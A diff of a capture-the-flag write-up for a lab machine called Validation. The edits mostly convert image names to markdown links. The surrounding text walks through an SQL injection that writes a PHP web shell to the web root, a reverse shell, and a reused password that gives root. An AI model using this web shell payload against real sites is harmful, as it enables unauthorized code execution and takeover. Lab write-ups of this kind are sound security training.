@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-Validation.png
+![Validation.png](../assets/validation_assets/Validation.png)
 
 ### Enumeration
 
@@ -59,7 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.48 seconds
 
 Navigating to the site on port 80, we find a page that looks to be a signup for UHC. 
 
-site.png
+![site.png](../assets/validation_assets/site.png)
 
 Lets capture the request in BurpSuite and see how the registration looks:
 
@@ -83,7 +83,7 @@ username=howdy&country=Brazil
 
 After tinkering around with the username field a bit, I tried adding a `'` character to the end of Brazil in the `country` field, to test for a possible SQL injection, and it seems we may be onto something!
 
-find_sqli.png
+![find_sqli.png](../assets/validation_assets/find_sqli.png)
 
 I didn't find anything too interesting in the databases, so I'm going to focus my attention on leveraging this SQLi into (hopefully) RCE. 
 
@@ -97,11 +97,11 @@ In Burp:
 username=howdy&country=Brazil' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/php-shell.php' --+-
 ```
 
-php-shell.png
+![php-shell.png](../assets/validation_assets/php-shell.png)
 
 Nice! We have code execution:
 
-whoami.png
+![whoami.png](../assets/validation_assets/whoami.png)
 
 From here we should just be able to use a one-liner to get a reverse shell on the box. Lets try with PHP first:
 
@@ -119,7 +119,7 @@ I set up a Netcat listener and navigated to:
 
 and caught a shell as www-data:
 
-shell.png
+![shell.png](../assets/validation_assets/shell.png)
 
 Lets quickly stabilize the shell with Python:
 
@@ -127,9 +127,9 @@ Lets quickly stabilize the shell with Python:
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-bash.png
+![bash.png](../assets/validation_assets/bash.png)
 
-ah, no dice. Interestingly, Python doesn't appear to be installed on the box. No worries, we can still stabilize this shell using another command:
+Ah, no dice. Interestingly, Python doesn't appear to be installed on the box. No worries, we can still stabilize this shell using another command:
 
 ```text
 /usr/bin/script -qc /bin/bash /dev/null
@@ -137,13 +137,13 @@ ah, no dice. Interestingly, Python doesn't appear to be installed on the box. No
 
 From here we can grab user.txt
 
-user_flag.png
+![user_flag.png](../assets/validation_assets/user_flag.png)
 
 ### Privilege Escalation
 
 Browsing around the machine a bit, I find an interesting file back in `/var/www/html` where we originally landed on this box, and find a password.
 
-password.png
+![password.png](../assets/validation_assets/password.png)
 
 Lets try to use this credential to switch users to root:
 
@@ -162,8 +162,10 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Nice! All that's left to do now is grab the final flag:
 
-root_flag.png
+![root_flag.png](../assets/validation_assets/root_flag.png)
 
 Thanks for following along!
 
 -Ryan
+
+-------------------------------------------------------------------
